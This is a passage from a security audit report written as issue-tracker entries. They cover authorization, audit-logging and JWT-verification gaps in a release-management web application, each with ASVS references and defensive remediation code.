    async with storage.read(task.asf_uid) as read:
        # Check if user still has access to project
        outcome = await read.as_committee_member_outcome(
            task.project.committee_key
        ).check_access()
        
        if not outcome.success:
            fail_task(task, f"Authorization revoked: {outcome.error}")
            log.warning(
                'task_authorization_revoked',
                extra={
                    'task_id': task.id,
                    'asf_uid': task.asf_uid,
                    'project': task.project_key
                }
            )
            return
    
    # Continue with task execution
    await execute_task(task)
```

This would involve checking if the user still has access to the project/committee at execution time, in addition to the existing ban check.

### Acceptance Criteria
- [ ] Add authorization re-verification in _task_process()
- [ ] Check committee/project membership at execution time
- [ ] Fail task with appropriate error if authorization lost
- [ ] Log authorization revocation events
- [ ] Unit tests for TOCTOU scenarios

### References
- Source reports: L1:8.2.2.md
- ASVS sections: 8.2.2
- CWE: CWE-367

### Priority
Low

---

## Issue: FINDING-429 - Asymmetric Authorization Enforcement Between Read and Write Paths

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The storage layer's Write class validates that asf_uid is not None before granting foundation committer access. The Read class lacks this check, creating asymmetry in authorization enforcement between read and write operations.

### Details
In `atr/storage/__init__.py` at line 89, the Read.as_foundation_committer_outcome() method does not validate asf_uid, while Write.as_foundation_committer_outcome() properly checks for None.

### Recommended Remediation
Add asf_uid validation to Read.as_foundation_committer_outcome() matching the check in Write.as_foundation_committer_outcome():

```python
# atr/storage/__init__.py
class Read:
    def as_foundation_committer_outcome(self) -> AccessAsFoundationCommitter:
        """Access as foundation committer with validation."""
        # Add validation matching Write class
        if self.__asf_uid is None:
            raise ValueError("asf_uid required for foundation committer access")
        
        return AccessAsFoundationCommitter(
            self.__data,
            AccessAs(self.__asf_uid, AccessLevel.FoundationCommitter)
        )
```

Ensure consistent authorization validation across read and write paths.

### Acceptance Criteria
- [ ] Add asf_uid validation to Read.as_foundation_committer_outcome()
- [ ] Match validation logic with Write class
- [ ] Verify consistent error handling
- [ ] Unit tests for None asf_uid scenarios

### References
- Source reports: L1:8.3.1.md
- ASVS sections: 8.3.1

### Priority
Low

---

## Issue: FINDING-430 - Missing Authorization Check on Distribution List Endpoint

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The distribution listing endpoint in atr/get/distribution.py does not perform project authorization checks before displaying distribution information, similar to the file viewing endpoints.

### Details
Distribution listing endpoint lacks `await session.check_access(project_key)` before retrieving distribution data, creating inconsistency with other endpoints that properly verify access.

### Recommended Remediation
Add project authorization check:

```python
# atr/get/distribution.py
async def distribution_list(project_key: str):
    # Add authorization check
    await session.check_access(project_key)
    
    # ... continue with distribution retrieval ...
```

### Acceptance Criteria
- [ ] Add session.check_access() before retrieving distribution data
- [ ] Verify unauthorized access returns 403
- [ ] Unit test for authorization check

### References
- Source reports: L1:8.3.1.md
- Related findings: ASVS-831-MEDIUM-001, ASVS-831-MEDIUM-003
- ASVS sections: 8.3.1
- CWE: CWE-862

### Priority
Low

---

## Issue: FINDING-431 - Missing Authorization Check on Checks Viewing Endpoint

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
One checks viewing endpoint in atr/get/checks.py is missing project authorization validation that is present in other checks viewing functions.

### Details
Inconsistent authorization checks across checks viewing functions. Some functions properly call `await session.check_access(project_key)` while at least one does not.

### Recommended Remediation
Add consistent project authorization checks across all check viewing functions:

```python
# atr/get/checks.py
async def view_checks(project_key: str, ...):
    # Add authorization check
    await session.check_access(project_key)
    
    # ... continue with checks retrieval ...
```

### Acceptance Criteria
- [ ] Audit all check viewing functions for authorization
- [ ] Add session.check_access() to functions missing it
- [ ] Verify consistent authorization across all check endpoints
- [ ] Unit tests for authorization on all check endpoints

### References
- Source reports: L1:8.3.1.md
- Related findings: ASVS-831-MEDIUM-001, ASVS-831-MEDIUM-003
- ASVS sections: 8.3.1
- CWE: CWE-862

### Priority
Low

---

## Issue: FINDING-432 - Vote Policy Validation Gap for Binding Status

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
Vote policy validation does not verify binding vote requirements are set appropriately in relation to total vote requirements, which could allow configurations where binding votes exceed total votes.

### Details
In `atr/storage/writers/vote.py`, vote policy validation lacks check ensuring `min_binding_votes <= min_total_votes` when both are configured.

### Recommended Remediation
Add validation ensuring min_binding_votes <= min_total_votes:

```python
# atr/storage/writers/vote.py
async def update_vote_policy(self, policy: VotePolicy):
    """Update vote policy with validation."""
    # Validate binding vs total votes
    if policy.min_binding_votes and policy.min_total_votes:
        if policy.min_binding_votes > policy.min_total_votes:
            raise ValueError(
                f"min_binding_votes ({policy.min_binding_votes}) cannot exceed "
                f"min_total_votes ({policy.min_total_votes})"
            )
    
    # ... continue with update ...
```

### Acceptance Criteria
- [ ] Add validation for binding vs total votes relationship
- [ ] Reject invalid configurations with clear error message
- [ ] Unit tests for validation edge cases
- [ ] Test min_binding_votes > min_total_votes rejection

### References
- Source reports: L1:8.3.1.md
- Related findings: ASVS-831-MEDIUM-005
- ASVS sections: 8.3.1

### Priority
Low

---

## Issue: FINDING-433 - Vote Recording Lacks Verification of Vote Completion Status

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
Vote recording in storage writer does not verify that vote duration has elapsed before allowing vote completion, relying on application logic rather than enforcing at storage layer.

### Details
In `atr/storage/writers/vote.py`, vote completion operations lack temporal validation to ensure vote duration has elapsed before accepting completion.

### Recommended Remediation
Add temporal validation in storage layer:

```python
# atr/storage/writers/vote.py
async def complete_vote(self, vote_id: str):
    """Complete a vote with temporal validation."""
    vote = await self.__data.get_vote(vote_id)
    
    # Verify vote duration has elapsed
    now = datetime.datetime.utcnow()
    vote_end = vote.created_at + datetime.timedelta(hours=vote.duration_hours)
    
    if now < vote_end:
        raise ValueError(
            f"Vote cannot be completed before {vote_end}. "
            f"Remaining time: {vote_end - now}"
        )
    
    # ... continue with completion ...
```

### Acceptance Criteria
- [ ] Add temporal validation to vote completion
- [ ] Verify vote duration has elapsed
- [ ] Reject premature completion with clear error
- [ ] Unit tests for temporal validation

### References
- Source reports: L1:8.3.1.md
- Related findings: ASVS-831-MEDIUM-005
- ASVS sections: 8.3.1

### Priority
Low

---

## Issue: FINDING-434 - Project Deletion Missing Additional Authorization Checks

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
Project deletion in storage writer accepts deletion requests without additional validation that project has no active releases or ongoing votes that should prevent deletion.

### Details
In `atr/storage/writers/project.py`, project deletion lacks validation checks for active releases and ongoing votes before allowing deletion.

### Recommended Remediation
Add validation checks before project deletion:

```python
# atr/storage/writers/project.py
async def delete_project(self, project_key: str):
    """Delete project with safety validation."""
    project = await self.__data.get_project(project_key)
    
    # Check for active releases
    active_releases = await self.__data.query_active_releases(project_key)
    if active_releases:
        raise ValueError(
            f"Cannot delete project with {len(active_releases)} active releases. "
            "Delete or archive releases first."
        )
    
    # Check for ongoing votes
    ongoing_votes = await self.__data.query_ongoing_votes(project_key)
    if ongoing_votes:
        raise ValueError(
            f"Cannot delete project with {len(ongoing_votes)} ongoing votes. "
            "Complete or cancel votes first."
        )
    
    # ... continue with deletion ...
```

### Acceptance Criteria
- [ ] Add validation for active releases before deletion
- [ ] Add validation for ongoing votes before deletion
- [ ] Reject deletion with clear error if blocking conditions exist
- [ ] Unit tests for all blocking conditions

### References
- Source reports: L1:8.3.1.md
- ASVS sections: 8.3.1

### Priority
Low

---

## Issue: FINDING-435 - Distribution Writer Missing Fine-Grained Permission Checks

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
Distribution automation operations accept parameters without fine-grained validation of user permissions for specific distribution operations beyond committee membership.

### Details
In `atr/storage/writers/distributions.py`, distribution operations validate committee membership but lack fine-grained permission checks for specific distribution actions.

### Recommended Remediation
Add specific permission checks for distribution operations:

```python
# atr/storage/writers/distributions.py
async def automate_distribution(self, ...):
    """Automate distribution with fine-grained permission check."""
    # Existing committee membership check
    await self._check_committee_member(committee_key)
    
    # Add fine-grained permission check
    if not await self._has_distribution_automation_permission(asf_uid, committee_key):
        raise PermissionError(
            "User does not have distribution automation permission"
        )
    
    # ... continue with automation ...
```

### Acceptance Criteria
- [ ] Add fine-grained permission checks beyond committee membership
- [ ] Define distribution-specific permission levels
- [ ] Unit tests for permission edge cases

### References
- Source reports: L1:8.3.1.md
- Related findings: ASVS-831-MEDIUM-002
- ASVS sections: 8.3.1

### Priority
Low

---

## Issue: FINDING-436 - API Models Lack Enum Validation for Phase Parameter

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
API models accept plain string for phase parameter (compose/vote/finish/published) rather than using Literal type enum, allowing invalid phase values that should be rejected at validation layer.

### Details
In `atr/models/api.py`, phase fields accept `str` instead of `Literal['compose', 'vote', 'finish', 'published']`, allowing invalid values to pass validation.

### Recommended Remediation
Replace `phase: str` with Literal type enum:

```python
# atr/models/api.py
from typing import Literal

class ReleaseModel(pydantic.BaseModel):
    phase: Literal['compose', 'vote', 'finish', 'published']
    # ... other fields ...

# This will automatically validate and reject invalid phase values
```

### Acceptance Criteria
- [ ] Replace phase: str with Literal enum in all API models
- [ ] Verify Pydantic validation rejects invalid phases
- [ ] Unit tests for invalid phase rejection
- [ ] Update API documentation with valid phase values

### References
- Source reports: L1:8.3.1.md
- Related findings: ASVS-831-MEDIUM-006
- ASVS sections: 8.3.1

### Priority
Low

---

## Issue: FINDING-437 - Background Task Worker Limited Authorization Re-Validation

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
Background task workers re-validate user ban status but do not perform comprehensive fine-grained permission re-validation at task execution time. Workers check only ban status, not full committee/project membership that may have changed since task was queued.

### Details
In `atr/tasks/*.py`, background task handlers check user ban status but do not re-verify full committee/project membership permissions at execution time.

### Recommended Remediation
Enhance background task re-validation to check full committee/project membership status:

```python
# atr/worker.py or atr/tasks/*.py
async def execute_task_with_revalidation(task: Task):
    """Execute task with comprehensive permission re-validation."""
    # Existing ban check
    if is_banned(task.asf_uid):
        fail_task(task, "User banned")
        return
    
    # Add full permission re-validation
    async with storage.read(task.asf_uid) as read:
        outcome = await read.as_committee_member_outcome(
            task.committee_key
        ).check_access()
        
        if not outcome.success:
            fail_task(task, f"Permission revoked: {outcome.error}")
            log.warning(
                'task_permission_revoked',
                extra={
                    'task_id': task.id,
                    'asf_uid': task.asf_uid,
                    'committee': task.committee_key
                }
            )
            return
    
    # Continue with task execution
    await execute_task(task)
```

If user no longer has required permissions, fail task with appropriate error.

### Acceptance Criteria
- [ ] Enhance re-validation to check full membership status
- [ ] Verify committee/project membership at execution time
- [ ] Fail tasks when permissions have been revoked
- [ ] Log permission revocation events
- [ ] Unit tests for permission revocation scenarios

### References
- Source reports: L1:8.3.1.md
- ASVS sections: 8.3.1

### Priority
Low

---

## Issue: FINDING-438 - Audit Log Access Pattern Not Consistently Applied

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
Audit logging through `storage.AccessAs.append_to_audit_log()` is consistently used for storage layer operations, but some direct database operations bypass this logging mechanism.

### Details
In `atr/post/keys.py` at lines 76-115 and `atr/post/revisions.py` at lines 67-95, direct database writes bypass the storage layer's audit logging mechanism.

### Recommended Remediation
Ensure all authorization-sensitive operations route through storage layer:

```python
# Instead of direct database access:
# await db.execute(update(...))  # NO AUDIT

# Use storage layer:
async with storage.write(asf_uid) as write:
    await write.as_committee_member(committee_key).update_keys(...)
    # Audit log automatically created
```

Eliminate direct database writes that bypass audit trail. Refactor all operations to use storage layer for consistent audit logging.

### Acceptance Criteria
- [ ] Audit all direct database operations
- [ ] Refactor to use storage layer where appropriate
- [ ] Verify audit logs created for all sensitive operations
- [ ] Unit tests for audit log coverage

### References
- Source reports: L1:8.3.1.md
- Related findings: ASVS-831-HIGH-001, ASVS-831-MEDIUM-004
- ASVS sections: 8.3.1

### Priority
Low

---

## Issue: FINDING-439 - Offset Validation Control Exists But Never Executes Due to Typo

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Offset validation logic exists in `_pagination_args_validate` but is never executed due to a typo in the attribute name check ('offest' instead of 'offset'). This means the validation control for maximum offset (1,000,000) and minimum offset (0) is bypassed for all pagination endpoints. While SQLite handles large offsets reasonably and limit validation is still enforced (max 1000 rows), this represents a defense-in-depth gap allowing unbounded offset values that may cause expensive database queries or resource exhaustion.

### Details
In `atr/api/__init__.py`:
- Line 819: Typo checks `hasattr(query_args, "offest")` instead of `"offset"`
- Affected endpoints at lines 456, 502, 565: /api/releases/list, /api/ssh-keys/list/<asf_uid>, /api/tasks/list

The validation block checks 'hasattr(query_args, "offest")' which always returns False, causing the offset validation to be skipped.

### Recommended Remediation
Fix typo in atr/api/__init__.py line 819:

```python
# Change from:
if hasattr(query_args, "offest"):  # TYPO

# To:
if hasattr(query_args, "offset"):  # CORRECT
```

**Add unit test to verify offset validation works:**
```python
async def test_offset_validation():
    # Test with excessive offset
    response = await client.get("/api/releases/list?offset=2000000")
    assert response.status_code == 400
    assert "offset" in response.json()["error"].lower()
```

**Add integration test** for each affected endpoint (/api/releases/list, /api/ssh-keys/list, /api/tasks/list).

**Add to code review checklist:** 'Validate attribute names in hasattr() checks'

### Acceptance Criteria
- [ ] Fix typo: "offest" → "offset"
- [ ] Add unit test for offset validation
- [ ] Add integration tests for affected endpoints
- [ ] Verify offset=2000000 raises BadRequest
- [ ] Add code review checklist item

### References
- Source reports: L2:8.1.2.md
- ASVS sections: 8.1.2

### Priority
Low

---

## Issue: FINDING-440 - Admin Operations Bypass Storage Layer Audit Logging

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Several admin routes access the database directly, bypassing the storage interface's audit logging. The `delete_committee_keys_post` function directly manipulates `committee.public_signing_keys` via `committee.public_signing_keys.clear()` and deletes orphaned keys without calling `storage.write()`, resulting in no audit log entry. In contrast, `revoke_user_tokens_post` properly uses the storage layer and generates audit logs.

### Details
In `atr/admin/__init__.py`:
- Lines 208-232: `delete_committee_keys_post()` uses direct database access (NO audit log)
- Lines 175-190: `revoke_user_tokens_post()` uses storage layer (HAS audit log)

While documentation acknowledges 'you can always import db directly,' the field-level access these operations have is not documented, nor is it clear which operations are audited vs. unaudited.

### Recommended Remediation
Document admin operations with storage layer bypass in `authorization-security.md`:

```markdown
## Admin Operation Audit Coverage

### Operations Using Storage Layer (Audited)
| Operation | Route | Audit Log | Storage Layer Method |
|-----------|-------|-----------|---------------------|
| Revoke user tokens | /admin/tokens/revoke | ✓ | write.as_admin().revoke_tokens() |
| Delete release | /admin/release/delete | ✓ | write.as_admin().delete_release() |

### Operations with Direct DB Access (Not Audited)
| Operation | Route | Audit Log | Rationale |
|-----------|-------|-----------|-----------|
| Delete committee keys | /admin/keys/delete | ✗ | Direct DB access for efficiency |

### Field-Level Access for Admin Operations
Admin operations using direct database access have unrestricted field access and bypass:
- Authorization re-verification
- Audit logging
- Validation rules
- Transaction isolation

### Best Practices
- Admin operations should use storage layer when possible for audit logging
- Direct DB access reserved for operations not supported by storage interface
- Document rationale for each direct DB operation

## Verification Steps
1. Audit all admin routes to identify storage layer bypass
2. Document which operations are audit logged vs. unaudited
3. Add explicit comments in code for direct DB access with rationale
4. Consider adding database-level audit triggers for admin operations
5. Add to security review checklist for admin operations audit logging requirements
```

### Acceptance Criteria
- [ ] Document admin operation audit coverage table
- [ ] List operations that bypass storage layer
- [ ] Document field-level access implications
- [ ] Add best practice guidance
- [ ] Add verification steps to security review checklist

### References
- Source reports: L2:8.1.2.md
- ASVS sections: 8.1.2

### Priority
Low

---

## Issue: FINDING-441 - Vote Tabulation Authorization Check Commented Out

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The vote tabulation endpoint has JWT authentication enabled but the identity extraction is commented out (`asf_uid = _jwt_asf_uid()` is commented), and the operation uses the lowest privilege level (`as_general_public()`). While ASF voting is transparent, the consumer's identity is not bound to the operation and there's no check that the consumer has any relationship to the project.

### Details
In `atr/api/__init__.py` at lines 1255-1290:
- JWT authentication is required via `@jwtoken.require`
- Identity extraction line is commented out
- Operation runs at GeneralPublic privilege level
- No verification of user's relationship to project

### Recommended Remediation
Choose one of three options:

**Option 1 (Restore authorization):**
```python
@app.route("/api/vote/tabulate", methods=["POST"])
@jwtoken.require
async def vote_tabulate():
    asf_uid = _jwt_asf_uid()  # Uncomment
    
    async with storage.write(asf_uid) as write:
        # Use authenticated identity and verify project relationship
        await write.as_committee_participant(
            release.project.committee_key
        ).tabulate_vote(...)
```

**Option 2 (Document intentional design):**
Add clear comment explaining authentication is for abuse prevention but operation runs at GeneralPublic since vote results are public.

**Option 3 (Remove authentication):**
If authentication serves no purpose, remove `@jwtoken.require` decorator.

### Acceptance Criteria
- [ ] Choose one of three options
- [ ] If option 1, uncomment identity extraction and add authorization
- [ ] If option 2, add clear documentation comments
- [ ] If option 3, remove @jwtoken.require
- [ ] Unit tests for chosen approach

### References
- Source reports: L2:8.2.3.md
- ASVS sections: 8.2.3

### Priority
Low

---

## Issue: FINDING-442 - Inconsistent `check_access` Calls in Distribution Endpoints

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
`automate_selected()` and `delete()` call `session.check_access(project_key)` before storage operations, but `record_selected()`, `stage_automate_selected()`, and `stage_record_selected()` do not. While all paths reach `storage.write_as_committee_member()` which performs core authorization, the inconsistency creates potential for future regression if `check_access` adds security-relevant validation beyond what the storage layer provides.

### Details
In `atr/post/distribution.py`:
- `automate_selected()` and `delete()`: Call `session.check_access()` ✓
- `record_selected()`, `stage_automate_selected()`, `stage_record_selected()`: Do NOT call `session.check_access()` ✗

### Recommended Remediation
Add `await session.check_access(project_key)` to all distribution POST handlers for consistency:

```python
async def record_selected(project_key: str, ...):
    # Add check_access for consistency
    await session.check_access(project_key)
    
    async with storage.write(session.asf_uid) as write:
        await write.as_committee_member(project.committee_key).record_distribution(...)

async def stage_automate_selected(project_key: str, ...):
    # Add check_access for consistency
    await session.check_access(project_key)
    
    async with storage.write(session.asf_uid) as write:
        await write.as_committee_member(project.committee_key).stage_automate(...)

async def stage_record_selected(project_key: str, ...):
    # Add check_access for consistency
    await session.check_access(project_key)
    
    async with storage.write(session.asf_uid) as write:
        await write.as_committee_member(project.committee_key).stage_record(...)
```

### Acceptance Criteria
- [ ] Add session.check_access() to record_selected()
- [ ] Add session.check_access() to stage_automate_selected()
- [ ] Add session.check_access() to stage_record_selected()
- [ ] Verify consistent pattern across all distribution endpoints
- [ ] Unit tests for authorization checks

### References
- Source reports: L2:8.2.3.md
- ASVS sections: 8.2.3

### Priority
Low

---

## Issue: FINDING-443 - Unverified JWT Subject Claim Used for Logging Before Signature Verification

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The verify() function performs an unverified JWT decode to extract the 'sub' claim for logging context (log.set_asf_uid()) before the verified signature check completes. This allows an attacker to inject arbitrary usernames into authentication failure log entries. The unverified decode happens first with verify_signature=False, then the sub claim is used for logging, and only afterward does signature verification occur. This creates a TOCTOU (Time-of-check Time-of-use) race condition where unverified data is used before verification completes.

### Details
In `atr/jwtoken.py` at lines 108-112:
1. Unverified decode: `claims_unsafe = jwt.decode(..., verify_signature=False)`
2. Extract and use unverified claim: `asf_uid = claims_unsafe['sub']`
3. Set logging context: `log.set_asf_uid(asf_uid)`
4. THEN perform verified decode

### Recommended Remediation
Refactor the verify() function to perform verified JWT decode first before using any claims data:

```python
async def verify(token: str) -> str:
    """Verify JWT token and return subject."""
    # Perform VERIFIED decode FIRST
    claims = jwt.decode(
        token,
        jwt_secret_key,
        algorithms=[_ALGORITHM],
        issuer=_ATR_JWT_ISSUER,
        audience=_ATR_JWT_AUDIENCE,
        options={"require": ["sub", "iss", "aud", "iat", "nbf", "exp", "jti"]},
    )
    
    # NOW extract subject from VERIFIED claims
    asf_uid = claims.get("sub")
    
    # Set logging context with verified data
    log.set_asf_uid(asf_uid)
    
    # Continue with security checks using verified data
    if not isinstance(asf_uid, str):
        raise ASFQuartException("Invalid subject type")
    
    if not await ldap.is_active(asf_uid):
        raise ASFQuartException("Account disabled")
    
    return asf_uid
```

**Alternative:** If logging is needed for failed attempts, only log unverified claims in exception handlers with clear warnings that the subject is unverified.

### Acceptance Criteria
- [ ] Perform verified decode before using claims
- [ ] Extract subject from verified claims only
- [ ] Set logging context with verified data
- [ ] If keeping unverified decode, clearly mark as unverified in logs
- [ ] Unit tests verifying logging uses verified data

### References
- Source reports: L1:9.1.1.md
- Related findings: FINDING-448
- ASVS sections: 9.1.1
- CWE: CWE-367

### Priority
Low

---

## Issue: FINDING-444 - Bearer Token Logged to stdout When No Token Handler Registered

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
When no PAT (Personal Access Token) handler is registered (which is the case for ATR), the `session.read()` function prints raw bearer tokens to stdout for debugging purposes. This function is called in before_request hooks for every incoming request with an Authorization header. While the token IS validated separately by @jwtoken.require before authorization decisions, the raw credential is exposed in application logs/stdout.

### Details
In `src/asfquart/session.py` at line 76:
```python
else:
    print(f"Bearer token: {bearer_token}")  # Logs full token!
```

This debug code prints the full token value when `app.token_handler` is not registered.

### Recommended Remediation
Remove or redact the debug print() statement that logs raw bearer tokens:

```python
# Replace line 76
else:
    logging.getLogger(__name__).debug('No PAT handler registered for bearer token authentication')
```

**Alternative:** Log only token metadata such as a truncated preview (first 10 chars + '...'):
```python
else:
    token_preview = bearer_token[:10] + '...' if len(bearer_token) > 10 else bearer_token
    logging.getLogger(__name__).debug(f'No PAT handler registered (token: {token_preview})')
```

**Best practice:** Remove debug code entirely in production.

### Acceptance Criteria
- [ ] Remove or redact bearer token from log statement
- [ ] Use proper logging framework instead of print()
- [ ] Verify no token values appear in stdout/logs
- [ ] Search codebase for similar debug print statements

### References
- Source reports: L1:9.1.1.md
- ASVS sections: 9.1.1
- CWE: CWE-532

### Priority
Low

---

## Issue: FINDING-445 - Documentation-Code TTL Discrepancy (JWT)

**Labels:** bug, security, priority:low, asvs-level:L1, asvs-level:L2

**ASVS Level(s):** L1, L2

**Description:**

### Summary
Documentation states JWT validity is "90 minutes" but code defines `_ATR_JWT_TTL = 30 * 60` (30 minutes), creating a discrepancy between expected and actual token lifetime. This can lead to operational confusion, incorrect security assumptions in dependent systems, and unnecessary support requests when tokens expire earlier than documented.

### Details
- Documentation: `atr/docs/authentication-security.md` states "90 minutes"
- Implementation: `atr/jwtoken.py` line 42 defines `_ATR_JWT_TTL = 30 * 60`

Actual behavior is more restrictive than documented (30 min vs 90 min), so not a security weakness, but discrepancy could confuse API consumers and create false assumptions during security audits.

### Recommended Remediation
**Option 1 (Recommended):** Update documentation to match code:
```markdown
* **Validity**: 30 minutes from creation
```

**Option 2:** If 90 minutes is the intended policy, update code:
```python
_ATR_JWT_TTL: Final[int] = 90 * 60  # 90 minutes
```

**Verification:** Review and align all documentation references to token lifetime, including API documentation, user guides, and inline code comments.

### Acceptance Criteria
- [ ] Choose option 1 or 2
- [ ] Update documentation or code to match
- [ ] Search for all "90 minutes" references
- [ ] Update all JWT validity period references
- [ ] Verify consistency between code and documentation

### References
- Source reports: L1:9.1.2.md, L2:9.2.2.md
- ASVS sections: 9.1.2, 9.2.2
- CWE: CWE-1188

### Priority
Low

---

## Issue: FINDING-446 - Incomplete Dangerous Header Blocking — Missing x5c and Related X.509 Headers

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The dangerous header check blocks jku, x5u, and jwk headers but does not include x5c (X.509 certificate chain), x5t (X.509 certificate SHA-1 thumbprint), or x5t#S256 (X.509 certificate SHA-256 thumbprint). While ASVS 9.1.3 explicitly names jku, x5u, and jwk, the use of 'such as' indicates these are illustrative examples, not an exhaustive list. Currently not exploitable because the code provides the signing key explicitly to jwt.decode(), but creates a defense-in-depth gap.

### Details
In `atr/jwtoken.py` at lines 142-145:
```python
dangerous_headers = {"jku", "x5u", "jwk"}  # Missing x5c, x5t, x5t#S256
```

This could become exploitable if:
1. The JWT library is upgraded and changes behavior regarding header processing
2. The code is refactored to derive keys from headers in some scenarios
3. A different decode path is introduced that doesn't explicitly provide keys
4. A developer copies this validation pattern to another context where keys aren't explicitly provided

### Recommended Remediation
Update line 143 in atr/jwtoken.py to include all X.509-related headers:

```python
dangerous_headers = {"jku", "x5u", "jwk", "x5c", "x5t", "x5t#S256"}
```

This completes the dangerous header blocking control and protects against future code or library changes.

**Effort:** Trivial (1 line change).

### Acceptance Criteria
- [ ] Add x5c, x5t, and x5t#S256 to dangerous_headers set
- [ ] Verify tokens with these headers are rejected
- [ ] Unit tests for all dangerous headers

### References
- Source reports: L1:9.1.3.md
- ASVS sections: 9.1.3

### Priority
Low

---

## Issue: FINDING-447 - `nbf` Claim Not Enforced as Required in ATR JWT Verification

**Labels:** bug, security, priority:low, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The `verify()` function uses PyJWT's `require` option to mandate the presence of specific claims but omits `nbf` from the required list. While PyJWT's default behavior (`verify_nbf=True`) does verify the `nbf` claim when present, it does not enforce that the claim must exist in the token. The vulnerability is not practically exploitable because ATR uses HS256 symmetric signing with a secret key, and attackers cannot forge valid tokens without the signing key. This is a defense-in-depth gap rather than an exploitable vulnerability.

### Details
In `atr/jwtoken.py` at lines 107-115, the `options={"require": [...]}` parameter does not include "nbf" in the list.

All legitimate ATR-issued tokens include `nbf`, so this only affects defense-in-depth.

### Recommended Remediation
Add `"nbf"` to the required claims list in the `jwt.decode()` call:

```python
# atr/jwtoken.py, line 113
claims = jwt.decode(
    token,
    jwt_secret_key,
    algorithms=[_ALGORITHM],
    issuer=_ATR_JWT_ISSUER,
    audience=_ATR_JWT_AUDIENCE,
    options={"require": ["sub", "iss", "aud", "iat", "nbf", "exp", "jti"]},
    #                                            ^^^^ ADDED
)
```

**Validation steps:**
1. All existing tests pass (tokens already include `nbf`)
2. Add negative test: token without `nbf` is rejected
3. Confirm error message indicates missing required claim

### Acceptance Criteria
- [ ] Add "nbf" to required claims list
- [ ] Verify tokens without nbf are rejected
- [ ] Add negative test for missing nbf claim
- [ ] Verify error message clarity

### References
- Source reports: L1:9.2.1.md
- ASVS sections: 9.2.1
- CWE: CWE-613

### Priority
Low

---

## Issue: FINDING-448 - Post-Verification Security Checks Use Unverified Token Claims

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The `verify()` function performs two JWT decode operations: one unverified (for logging) and one verified (for security). However, security-relevant operations (LDAP account status check via `ldap.is_active()`, subject type validation via `isinstance()`) use claims from the unverified decode instead of the verified decode. While not currently exploitable (both decode operations process the same token bytes), this violates the principle that security decisions must use verified data and creates future refactoring risk.

### Details
In `atr/jwtoken.py` at lines 104-137:
1. Unverified decode to get `claims_unsafe`
2. Verified decode to get `claims`
3. Security checks (LDAP, type validation) use `claims_unsafe['sub']` instead of `claims['sub']`

### Recommended Remediation
Change lines 118-123 to use `asf_uid = claims.get("sub")` (from verified claims) instead of extracting from `claims_unsafe`:

```python
async def verify(token: str) -> str:
    # Perform verified decode
    claims = jwt.decode(...)
    
    # Extract subject from VERIFIED claims
    asf_uid = claims.get("sub")  # Use claims, not claims_unsafe
    
    # Keep unverified decode only for pre-verification logging if needed
    # But use verified claims for all security checks
    if not isinstance(asf_uid, str):
        raise ASFQuartException("Invalid subject type")
    
    if not await ldap.is_active(asf_uid):
        raise ASFQuartException("Account disabled")
    
    return asf_uid
```

This ensures all security-relevant operations (LDAP lookups, type checks) use cryptographically verified data.

### Acceptance Criteria
- [ ] Use claims['sub'] instead of claims_unsafe['sub'] for security checks
- [ ] Keep unverified decode only for logging purposes if needed
- [ ] Verify all security-relevant operations use verified claims
- [ ] Unit tests confirming verified data usage

### References
- Source reports: L2:9.2.2.md
- Related findings: FINDING-443
- ASVS sections: 9.2.2
- CWE: CWE-345

### Priority
Low

---

## Issue: FINDING-449 - JWT Audience Values Contain 'test' Identifier

**Labels:** bug, security, priority:low, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Both audience constants contain 'test' in their names (`_ATR_JWT_AUDIENCE = "atr-api-pat-test-v1"` and `_GITHUB_OIDC_AUDIENCE = "atr-test-v1"`), which may indicate development/testing configuration carried over to production deployment. While the audience values are functionally secure (distinct from each other, correctly validated), the naming suggests incomplete production configuration and could cause operational confusion about the token's intended deployment context.

### Details
In `atr/jwtoken.py` at lines 23-24:
```python
_ATR_JWT_AUDIENCE = "atr-api-pat-test-v1"  # Contains 'test'
_GITHUB_OIDC_AUDIENCE = "atr-test-v1"      # Contains 'test'
```

### Recommended Remediation
Update audience values to production-appropriate URIs:

```python
# Option 1: Full URIs
_ATR_JWT_AUDIENCE = "https://release.apache.org/api/v1"
_GITHUB_OIDC_AUDIENCE = "https://release.apache.org/trusted-publisher/v1"

# Option 2: Environment-specific configuration
import os
APP_HOST = os.getenv("APP_HOST", "release.apache.org")
_ATR_JWT_AUDIENCE = f"https://{APP_HOST}/api/v1"
_GITHUB_OIDC_AUDIENCE = f"https://{APP_HOST}/trusted-publisher/v1"
```

Remove 'test' identifiers for clarity and operational confidence.

### Acceptance Criteria
- [ ] Update audience values to production-appropriate identifiers
- [ ] Remove 'test' from audience strings
- [ ] Consider environment-specific configuration
- [ ] Update any dependent systems expecting old audience values
- [ ] Verify JWT validation still works with new audiences

### References
- Source reports: L2:9.2.2.md
